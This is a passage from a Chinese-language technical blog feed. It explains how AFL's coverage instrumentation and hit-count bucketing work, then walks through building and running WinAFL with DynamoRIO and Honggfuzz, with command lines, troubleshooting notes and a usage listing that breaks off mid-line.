class="number">1</span>;</span><br><span class="line">++*(_BYTE *)(v19 + v20);</span><br></pre></td></tr></table></figure><p>其中 a2 保存的寄存器 rcx 的值，跟踪可以发现，rcx 存贮的是随机数，那么简单来说上述流程就是：就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将<code>cur_location</code> 的值右移一位然后得到新的<code>prev_location</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>因为，AFL在为每个代码块插桩的时候都会生成一个随机数，作为其”位置”的记录，然后对分支处的”源位置”和”目标位置”进行异或，讲其结果作为该分支的 key，并保存每个分支的执行次数。</p><p>用于保存执行次数的实际上是一个哈希表，大小为<code>MAP_SIZE=64K</code>，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      1,000 | 0.75%            | giflib, lzo</span><br><span class="line">      2,000 | 1.5%             | zlib, tar, xz</span><br><span class="line">      5,000 | 3.5%             | libpng, libwebp</span><br><span class="line">     10,000 | 7%               | libxml</span><br><span class="line">     20,000 | 14%              | sqlite</span><br><span class="line">     50,000 | 30%              | -</span><br></pre></td></tr></table></figure><p>如果一个目标过于复杂，那么AFL状态面板中的map_density信息就会有相应的提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│    map density : 3.61% &#x2F; 14.13%        │</span><br><span class="line">│ count coverage : 6.35 bits&#x2F;tuple       │</span><br><span class="line">┼─ findings in depth ────────────────────┤</span><br></pre></td></tr></table></figure><p>这里的map density，就是这张哈希表的密度。可以看到，上面示例中，该次执行的哈希表密度仅为3.61%，即整个哈希表差不多有95%的地方还是空的，所以碰撞的概率很小。不过，如果目标很复杂，map density很大，那么就需要考虑到碰撞的影响了。</p><p>另外，AFL需要将<code>cur_location</code>右移1位后，再保存到<code>prev_location</code>中。官方文档中解释了这样做的原因。假设target中存在<code>A-&gt;A</code>和<code>B-&gt;B</code>这样两个跳转，如果不右移，那么这两个分支对应的异或后的key都是0，从而无法区分；另一个例子是<code>A-&gt;B</code>和<code>B-&gt;A</code>，如果不右移，这两个分支对应的异或后的key也是相同的。</p><p>由上述分析可知，之前提到的共享内存，被用于保存一张哈希表，target在这张表中记录每个分支的执行数量。随后，当target执行结束后，fuzzer便开始对这张表进行分析，从而判断代码的执行情况。</p><h1 id="分支信息的分析"><a href="#分支信息的分析" class="headerlink" title="分支信息的分析"></a>分支信息的分析</h1><p>首先，fuzzer通过调用 <code>classify_counts</code> 对<code>trace_bits</code>（共享内存）进行预处理</p><p>具体地，target 是将每个分支的执行次数用 1 个 byte 来储存，而 fuzzer 则进一步把这个执行次数归入以下的 buckets 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>, </span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>, </span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>, </span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>, </span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, </span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>举个例子，如果某分支执行了 1 次，那么落入第 2 个 bucket，其计数 byte 仍为 1；如果某分支执行了 4 次，那么落入第 5 个 bucket，其计数 byte 将变为 8，等等。（执行了 4-7 次的其计数为 8）</p><p>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况。</p><p>随后，对于某些mutated input来说，如果这次执行没有出现崩溃等异常输出，fuzzer还会检查其是否新增了执行路径。具体来说，是对<code>trace_bits</code>计算hash并来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br></pre></td></tr></table></figure><p>通过比较hash值，就可以判断<code>trace_bits</code>是否发生了变化，从而判断此次mutated input是否带来了新路径，为之后的fuzzing提供参考信息。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></p><p><a href="https://www.cnblogs.com/52php/p/5861372.html">https://www.cnblogs.com/52php/p/5861372.html</a></p><p><a href="http://rk700.github.io/2017/12/28/afl-internals/">http://rk700.github.io/2017/12/28/afl-internals/</a></p><p><a href="https://xz.aliyun.com/t/4628#toc-10">https://xz.aliyun.com/t/4628#toc-10</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=9d0ff5e0bae65f9ca9dbea4cf74449c6&amp;chksm=fb04159acc739c8c36e0785e2ce9c3a202066c6cc39a9ce32fd0fc9dfeb348e860a82e29c9d6&amp;scene=178&amp;cur_album_id=1363100069033066496#rd">https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=9d0ff5e0bae65f9ca9dbea4cf74449c6&amp;chksm=fb04159acc739c8c36e0785e2ce9c3a202066c6cc39a9ce32fd0fc9dfeb348e860a82e29c9d6&amp;scene=178&amp;cur_album_id=1363100069033066496#rd</a></p><p><a href="https://paper.seebug.org/842/#1-code-coverage">https://paper.seebug.org/842/#1-code-coverage</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Build Winafl | HonggFuzz | AFL</title>
      <link href="posts/32c104a1/"/>
      <url>posts/32c104a1/</url>
      
        <content type="html"><![CDATA[<h1 id="Winafl-Build"><a href="#Winafl-Build" class="headerlink" title="Winafl Build"></a>Winafl Build</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>版本：    Windows 10 专业版</p><p>版本号：    20H2</p><h2 id="Winafl-搭建"><a href="#Winafl-搭建" class="headerlink" title="Winafl 搭建"></a>Winafl 搭建</h2><h3 id="Installing-Visual-Studio-2017-Installing-Visual-Studio-2019"><a href="#Installing-Visual-Studio-2017-Installing-Visual-Studio-2019" class="headerlink" title="Installing Visual Studio 2017 / Installing Visual Studio 2019"></a>Installing Visual Studio 2017 / Installing Visual Studio 2019</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://x9security.com/wp-content/uploads/2020/09/Installing_vs2017.png"></p><h3 id="Installing-git-amp-cmake-amp-python2"><a href="#Installing-git-amp-cmake-amp-python2" class="headerlink" title="Installing git &amp; cmake &amp; python2"></a>Installing git &amp; cmake &amp; python2</h3><h3 id="Installing-DynamoRIO-amp-WinAFL"><a href="#Installing-DynamoRIO-amp-WinAFL" class="headerlink" title="Installing DynamoRIO &amp; WinAFL"></a>Installing DynamoRIO &amp; WinAFL</h3><p>下载 <a href="https://github.com/googleprojectzero/winafl">WINAFL</a>：<a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p>下载<a href="https://github.com/DynamoRIO/dynamorio/releases">DynamoRIO</a>：<a href="https://github.com/DynamoRIO/dynamorio/releases">https://github.com/DynamoRIO/dynamorio/releases</a></p><p>下载后把二者解压到同一文件夹下，如 <code>myafl</code>，手动编译 <code>x64</code>环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\air\Desktop&gt;cd myafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl&gt;cd winafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;mkdir build64</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;cd build64</span><br><span class="line">if VS2019</span><br><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake</span><br><span class="line">cmake --build . --config Release</span><br><span class="line"></span><br><span class="line">if VS2017</span><br><span class="line">cmake -G&quot;Visual Studio 15 2017&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake </span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h3 id="DynamoRIO"><a href="#DynamoRIO" class="headerlink" title="DynamoRIO"></a>DynamoRIO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 1. 后面跟 &lt;客户端&gt; &lt;客户端 参数&gt; —(分割线) &lt;目标程序 和 目标程序参数&gt;</span><br><span class="line">-c &lt;client&gt; [client options] — &lt;app and args to run&gt;</span><br><span class="line">&#x2F;&#x2F; 2.1 winafl.dll 参数说明。这也是插桩参数的使用[instrumentation options]</span><br><span class="line">-debug # debug模式, 它会生成一个log文件</span><br><span class="line">-target_module # 目标程序(只能有一个), 也是target_offset所在的模块</span><br><span class="line">-target_offset # 目标程序偏移，相对于target_module的偏移，在method无法导出的时候使用</span><br><span class="line">-fuzz_iterations # 目标程序重新启动一次内运行目标函数(即target_method)的最大迭代数</span><br><span class="line">-nargs # 目标程序执行所需要的参数个数(包括目标程序本身)</span><br><span class="line">-target_module # 目标函数,需要export或者调试符号(pdb)</span><br><span class="line">-coverage_module # 计算覆盖率的模块,也就是目标程序会调用的模块(dll); (可以有多个)</span><br></pre></td></tr></table></figure><h3 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-i dir        - input directory with test cases</span><br><span class="line">-o dir        - output directory for fuzzer findings</span><br><span class="line">-t msec       - timeout for each run</span><br><span class="line">-D dir        - directory containing DynamoRIO binaries (drrun, drconfig)</span><br><span class="line">-P            - use Intel PT tracing mode</span><br><span class="line">-Y            - enable the static instrumentation mode</span><br><span class="line">-f file       - location read by the fuzzed program</span><br><span class="line">-m limit      - memory limit for the target process</span><br><span class="line">-p            - persist DynamoRIO cache across target process restarts</span><br><span class="line">-c cpu        - the CPU to run the fuzzed program</span><br><span class="line">-d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">-n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">-x dir        - optional fuzzer dictionary</span><br><span class="line">-I msec       - timeout for process initialization and first run</span><br><span class="line">-T text       - text banner to show on the screen</span><br><span class="line">-M \\ -S id   - distributed mode</span><br><span class="line">-C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line">-l path       - a path to user-defined DLL for custom test cases processing</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -i C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\tiff -o </span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\in -covtype edge -coverage_module xxx.dll -target_module xxx.exe -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">.\afl-fuzz.exe -i in -o out -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -- -target_module xxx.exe -coverage_module xxx.dll -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">drrun.exe -c winafl.dll -debug -target_module test_gdiplus.exe -target_offset 0x10D0 -fuzz_iterations 10 -nargs 2 -- test_gdiplus.exe input.bmp</span><br><span class="line"></span><br><span class="line">for i in *; do afl-tmin -i $i -o tmin-$i -- ~&#x2F;path&#x2F;to&#x2F;tested&#x2F;program [params] @@; done; </span><br></pre></td></tr></table></figure></blockquote><h2 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h2><h3 id="cmin"><a href="#cmin" class="headerlink" title="cmin"></a>cmin</h3><p>[-] PROGRAM ABORT : Unexpected result from pipe! expected ‘P’, instead received ‘C’</p><p>put <code>winafl-cmin.py</code> <code>winafl.dll</code> and other winafl program in the same directory as your test program.</p><p>test <code>winafl-cmin.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -i  D:\Dropbox\fuzzing\test\input  -o D:\Dropbox\fuzzing\test\minset -covtype edge -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -v -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><p>test <code>afl-fuzz.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe -i D:\Dropbox\fuzzing\test\minset -o output -M master -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -- -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><h3 id="dry-run"><a href="#dry-run" class="headerlink" title="dry-run"></a>dry-run</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Dry-run failed, 2 executions resulted differently: </span><br><span class="line">Tuples matching? False </span><br><span class="line">Return codes matching? True</span><br></pre></td></tr></table></figure><p>这个 Bug，我感觉是<code>winafl-cmin.py</code>写的有些问题，目前大概发现两种解决办法。</p><p>First：<a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html%EF%BC%8C%E5%8F%82%E8%80%83%E8%BF%99%E7%AF%87%E4%BD%9C%E8%80%85%EF%BC%8C%E8%AE%A9">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html，参考这篇作者，让</a> <code>target</code> 执行一次样本，把垃圾样本剔除。</p><p>Second：在执行<code>winafl-cmin.py</code>的时候，加入 <code>--skip-dry-run</code>，跳过 dry-run</p><h3 id="time-out"><a href="#time-out" class="headerlink" title="time out"></a>time out</h3><p>我所碰到的情况都是 <code>target</code>偏移没有找对，然后运行 <code>winafl</code>的时候就会无限 time out</p><h1 id="Honggfuzz-Build"><a href="#Honggfuzz-Build" class="headerlink" title="Honggfuzz Build"></a>Honggfuzz Build</h1><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 18.04</p><h2 id="HonggFuzz-搭建"><a href="#HonggFuzz-搭建" class="headerlink" title="HonggFuzz 搭建"></a>HonggFuzz 搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install clang-10</span><br><span class="line">$ sudo apt install libbfd-dev</span><br><span class="line">$ sudo apt install libunwind8-dev</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;honggfuzz.git</span><br><span class="line">$ cd honggfuzz</span><br><span class="line">honggfuzz$ make</span><br><span class="line">honggfuzz$ sudo make install</span><br></pre></td></tr></table></figure><p>然后在 <code>/usr/bin</code>里面将 <code>clang-10</code>修改为<code>clang</code> <code>clang++-10</code>修改为<code>clang++</code>（其实就是把clang-10设置成默认版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~$ clang -v</span><br><span class="line">clang version 10.0.0-4ubuntu1~18.04.2 </span><br><span class="line">Target: x86_64-pc-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line">InstalledDir: &#x2F;usr&#x2F;bin</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;8</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;8</span><br><span class="line">Selected GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Candidate multilib: .;@m64</span><br><span class="line">Selected multilib: .;@m64</span><br></pre></td></tr></table></figure><p>HoggFuzz 使用文档：<a href="https://github.com/google/honggfuzz/blob/master/docs/USAGE.md">https://github.com/google/honggfuzz/blob/master/docs/USAGE.md</a></p><h2 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">Usage: .&#x2F;honggfuzz [options] -- path_to_command [args]</span><br><span class="line">Options:</span><br><span class="line"> --help|-h </span><br><span class="line">Help plz..</span><br><span class="line"> --input|-i VALUE</span><br><span class="line">Path to a directory containing initial file corpus</span><br><span class="line"> --output VALUE</span><br><span class="line">Output data (new dynamic coverage corpus, or the minimized coverage corpus) is written to this directory (default: input directory is used)</span><br><span class="line"> --persistent|-P </span><br><span class="line">Enable persistent fuzzing (use hfuzz_cc&#x2F;hfuzz-clang to compile code). This will be auto-detected!!!</span><br><span class="line"> --instrument|-z </span><br><span class="line">*DEFAULT-MODE-BY-DEFAULT* Enable compile-time instrumentation (use hfuzz_cc&#x2F;hfuzz-clang to compile code)</span><br><span class="line"> --minimize|-M </span><br><span class="line">Minimize the input corpus. It will most likely delete some corpus files (from the --input directory) if no --output is used!</span><br><span class="line"> --noinst|-x </span><br><span class="line">Static mode only, disable any instrumentation (hw&#x2F;sw) feedback</span><br><span class="line"> --keep_output|-Q </span><br><span class="line">Don&#39;t close children&#39;s stdin, stdout, stderr; can be noisy</span><br><span class="line"> --timeout|-t VALUE</span><br><span class="line">Timeout in seconds (default: 10)</span><br><span class="line"> --threads|-n VALUE</span><br><span class="line">Number of concurrent fuzzing threads (default: number of CPUs &#x2F; 2)</span><br><span class="line"> --stdin_input|-s </span><br><span class="line">Provide fuzzing input on STDIN, instead of ___FILE___</span><br><span class="line"> --mutations_per_run|-r VALUE</span><br><span class="line">Maximal number of mutations per one run (default: 6)</span><br><span class="line"> --logfile|-l VALUE</span><br><span class="line">Log file</span><br><span class="line"> --verbose|-v </span><br><span class="line">Disable ANSI console; use simple log output</span><br><span class="line"> --verifier|-V </span><br><span class="line">Enable crashes verifier</span><br><span class="line"> --debug|-d </span><br><span class="line">Show debug messages (level &gt;&#x3D; 4)</span><br><span class="line"> --quiet|-q </span><br><span class="line">Show only warnings and more serious messages (level &lt;&#x3D; 1)</span><br><span class="line"> --extension|-e VALUE</span><br><span class="line">Input file extension (e.g. &#39;swf&#39;), (default: &#39;fuzz&#39;)</span><br><span class="line"> --workspace|-W VALUE</span><br><span class="line">Workspace directory to save crashes &amp; runtime files (default: &#39;.&#39;)</span><br><span class="line"> --crashdir VALUE</span><br><span class="line">Directory where crashes are saved to (default: workspace directory)</span><br><span class="line"> --covdir_all VALUE</span><br><span class="line">** DEPRECATED ** use --output</span><br><span class="line"> --covdir_new VALUE</span><br><span class="line">New coverage (beyond the dry-run fuzzing phase) is written to this separate directory</span><br><span class="line"> --dict|-w VALUE</span><br><span class="line">Dictionary file. Format:http:&#x2F;&#x2F;llvm.org&#x2F;docs&#x2F;LibFuzzer.html#dictionaries</span><br><span class="line"> --stackhash_bl|-B VALUE</span><br><span class="line">Stackhashes blacklist file (one entry per line)</span><br><span class="line"> --mutate_cmd|-c VALUE</span><br><span class="line">External command producing fuzz files (instead of internal mutators)</span><br><span class="line"> --pprocess_cmd VALUE</span><br><span class="line">External command postprocessing files produced by internal mutators</span><br><span class="line"> --ffmutate_cmd VALUE</span><br><span class="line">External command mutating files which have effective coverage feedback</span><br><span class="line"> --run_time VALUE</span><br><span class="line">Number of seconds this fuzzing session will last (default: 0 [no limit])</span><br><span class="line"> --iterations|-N VALUE</span><br><span class="line">Number of fuzzing iterations (default: 0 [no limit])</span><br><span class="line"> --rlimit_as VALUE</span><br><span class="line">Per process RLIMIT_AS in MiB (default: 0 [no limit])</span><br><span class="line"> --rlimit_rss VALUE</span><br><span class="line">Per process RLIMIT_RSS in MiB (default: 0 [no limit]). It will also set *SAN&#39;s soft_rss_limit_mb if used</span><br><span class="line"> --rlimit_data VALUE</span><br><span class="line">Per process RLIMIT_DATA in MiB (default: 0 [no limit])</span><br><span class="line"> --rlimit_core VALUE</span><br><span class="line">Per process RLIMIT_CORE in MiB (default: 0 [no cores are produced])</span><br><span class="line"> --report|-R VALUE</span><br><span class="line">Write report to this file (default: &#39;&lt;workdir&gt;&#x2F;HONGGFUZZ.REPORT.TXT&#39;)</span><br><span class="line"> --max_file_size|-F VALUE</span><br><span class="line">Maximal size of files processed by the fuzzer in bytes (default: 1048576 &#x3D; 1MB)</span><br><span class="line"> --clear_env </span><br><span class="line">Clear all environment variables before executing the binary</span><br><span class="line"> --env|-E VALUE</span><br><span class="line">Pass this environment variable, can be used multiple times</span><br><span class="line"> --save_all|-u </span><br><span class="line">Save all test-cases (not only the unique ones) by appending the current time-stamp to the filenames</span><br><span class="line"> --save_smaller|-U</span><br><span class="line">    Save smaller test-cases, renaming first found with .orig suffix</span><br><span class="line"> --tmout_sigvtalrm|-T </span><br><span class="line">Use SIGVTALRM to kill timeouting processes (default: use SIGKILL)</span><br><span class="line"> --sanitizers|-S </span><br><span class="line">Enable sanitizers settings (default: false)</span><br><span class="line"> --monitor_sigabrt VALUE</span><br><span class="line">Monitor SIGABRT (default: false for Android, true for other platforms)</span><br><span class="line"> --no_fb_timeout VALUE</span><br><span class="line">Skip feedback if the process has timeouted (default: false)</span><br><span class="line"> --exit_upon_crash </span><br><span class="line">Exit upon seeing the first crash (default: false)</span><br><span class="line"> --socket_fuzzer </span><br><span class="line">Instrument external fuzzer via socket</span><br><span class="line"> --netdriver </span><br><span class="line">Use netdriver (libhfnetdriver&#x2F;). In most cases it will be autodetected through a binary signature</span><br><span class="line"> --only_printable </span><br><span class="line">Only generate printable inputs</span><br><span class="line"> --linux_symbols_bl VALUE</span><br><span class="line">Symbols blacklist filter file (one entry per 